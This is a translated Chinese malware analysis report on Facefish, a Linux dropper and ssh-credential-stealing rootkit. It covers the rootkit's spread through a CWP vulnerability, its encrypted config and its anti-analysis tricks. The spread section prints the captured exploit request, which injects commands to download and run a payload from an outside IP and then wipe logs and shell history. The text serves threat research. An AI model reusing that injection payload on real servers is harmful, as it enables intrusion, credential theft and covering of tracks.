# 窃密者Facefish分析报告
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 背景介绍
2021年2月，我们捕获了一个通过CWP的Nday漏洞传播的未知ELF样本，简单分析后发现这是一个新botnet家族的样本。它针对Linux
x64系统，配置灵活，并且使用了一个基于Diffie–Hellman和Blowfish的私有加密协议。但因为通过合作机构（在中国区有较好网络通信观察视野）验证后发现对应的C2通信命中为0，所以未再深入分析。
2021年4月26号，Juniper发布了关于此样本的[分析报告](https://blogs.juniper.net/en-us/threat-research/linux-servers-hijacked-to-implant-ssh-backdoor)，我们注意到报告中忽略了一些重要的技术细节，所以决定将漏掉的细节分享出来。
该家族的入口ELF样本MD5=38fb322cc6d09a6ab85784ede56bc5a7是一个Dropper，它会释放出一个Rootkit。因为Juniper并未为样本定义家族名，鉴于Dropper在不同的时间点释放的Rootkit有不同的MD5值，犹如川剧中的变脸，并且该家族使用了Blowfish加密算法，我们将它命名为Facefish。
## Facefish概览
Facefish由Dropper和Rootkit
2部分组成，主要功能由Rootkit模块决定。Rootkit工作在Ring3层，利用LD_PRELOAD特性加载，通过Hook
ssh/sshd程序的相关函数以窃取用户的登录凭证，同时它还支持一些后门功能。因此可以将Facefish定性为，一款针对Linux平台的窃密后门。
Facefish的主要功能有
  * 上报设备信息
  * 窃取用户凭证
  * 反弹Shell
  * 执行任意命令
基本流程如下图所示：
## 传播方式
在野利用的漏洞如下所示
    POST /admin/index.php?scripts=.%00./.%00./client/include/inc_index&service_start=;cd%20/usr/bin;%20/usr/bin/wget%20http://176.111.174.26/76523y4gjhasd6/sshins;%20chmod%200777%20/usr/bin/sshins;%20ls%20-al%20/usr/bin/sshins;%20./sshins;%20cat%20/etc/ld.so.preload;%20rm%20-rf%20/usr/bin/sshins;%20sed%20-i%20'/sshins/d'%20/usr/local/cwpsrv/logs/access_log;%20history%20-c;&owner=root&override=1&api_key=%00%00%C2%90 HTTP/1.1
    Host: xxx.xx.xx.xx:2031
    User-Agent: python-requests/2.25.1
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Length: 0
将与Facefish相关部分转码后，得到以下执行命令序列，可以看出主要功能为下载执行第一阶段的payload，然后清理痕迹。
    cd /usr/bin; 
    /usr/bin/wget ; 
    chmod 0777 /usr/bin/sshins; 
    ls -al /usr/bin/sshins; ./sshins; 
    cat /etc/ld.so.preload;
    rm -rf /usr/bin/sshins; 
    sed -i '/sshins/d' /usr/local/cwpsrv/logs/access_log; 
    history -c
## 逆向分析
简单来说，Facefish的感染程序可以分成3个阶段，
Stage 0: 预备阶段，通过漏洞传播，在设备上植入Dropper
Stage 1: 释放阶段，Dropper释放出Rootkit
Stage 2:业务阶段，Rootkit 收集回传敏感信息，等待执行C2下发的指令
下文将从Stage 1到Stage 2着手，分析Facefish的各个阶段的技术细节。
### Stage 1:Dropper分析
Dropper的基体信息如下所示，主要功能为检测运行环境，解密存有C2信息的Config， 配置Rootkit，最后释放并启动Rootkit。
> MD5:38fb322cc6d09a6ab85784ede56bc5a7
>
> ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked,
> stripped
>
> Packer: UPX
另处值得一提的是，Drooper在二进制层面，采用了一些tricks来对抗杀软的查杀。
### Trick 1:upx with overlay
如下图所示，将加密的Config数据作为overlay，填充到upx加壳后的样本尾部。
这种做法的目的有2个:
  1. 对抗upx脱壳
  2. Config数据与样本解耦，可以通过工具更新Config，无需再编译源码，方便在黑市流通
### Trick 2:elf without sections
如下图所示，脱壳后样本中的section信息被抹除了
这种做法的目的有2个:
  1. 某些依赖section的信息进行分析的工具无法正常工作，抹除section在一定程度上加大了分析难度
  2. 某些杀毒引擎依赖section信息生成特征的的检测区，抹除section在一定程度上实现了免杀
### Dropper主要功能
Dropper运行时会输出下图中的信息：
根据这个信息，我们将Dropper的功能分成了以下4个阶段
  1. 检测运行环境
  2. 解密Config
  3. 配置Rootkit
  4. 释放并启动Rootkit
**0x1:检测运行环境**
首先读取/bin/cat的前16个字节，通过判断第5个字节(EI_CLASS)的值来判断当前系统的位数,目前Facefish只支持x64系统。然后检查自身否在root权限下运行，最后尝试从自身文件尾部
读入Config信息。其中任一环节失败，Facefish都将放弃感染，直接退出。
**0x2:解密Config**
原始的Config信息长度为128字节，采用Blowfish算法的CBC模式加密，以overlay的形式储存在文件尾部。其中Blowfish的解密key&iv如下：
  * key:buil
  * iv:00 00 00 00 00 00 00 00
值得一提的是在使用Blowfish时，其作者在编码过程中，玩了一个小trick来“恶心”安全研究人员，以下图代码片段为例：
第一眼看上去，会让人以为Blowfish的密钥为”build”。注意第3个参数为4，即密钥的长度为4字节，所以真实的密钥为”buil”。
以原始的Config为例，
    BD E8 3F 94 57 A4 82 94 E3 B6 E9 9C B7 91 BC 59
    5B B2 7E 74 2D 2E 2D 9B 94 F6 E5 3A 51 C7 D8 56
    E4 EF A8 81 AC EB A6 DF 8B 7E DB 5F 25 53 62 E2
    00 A1 69 BB 42 08 34 03 46 AF A5 7B B7 50 97 69
    EB B2 2E 78 68 13 FA 5B 41 37 B6 D0 FB FA DA E1
    A0 9E 6E 5B 5B 89 B7 64 E8 58 B1 79 2F F5 0C FF
    71 64 1A CB BB E9 10 1A A6 AC 68 AF 4D AD 67 D1
    BA A1 F3 E6 87 46 09 05 19 72 94 63 9F 50 05 B7
解密后的Config如下所示，可以看到其中的c2:port信息（176.111.174.26:443）。
各字段具体的含义如下:
OFFSET | LENGTH | MEANING  
---|---|---  
0x00 | 4 | magic  
0x0c | 4 | interval  
0x10 | 4 | offset of c2  
0x14 | 4 | port  
0x20(pointed by 0x10) |  | c2  
解密完成后，通过以下代码片段对Config进行校验，校验方法比较简单，即比较magic值是不是0xCAFEBABE，当校验通过后，进入配置Rootkit阶段。
**0x3:配置Rootkit**
首先以当前时间为种子随机生成16个字节做为新的Blowfish的加密key，将上阶段的解密得到的Config使用新的key重新加密。
然后利用标志0xCAFEBABEDEADBEEF定位Dropper中的Rootkit的特定位置，写入新的加密key以及重新加密后的Config信息。
文件的变化如下所示：  
写入之前：
写入之后：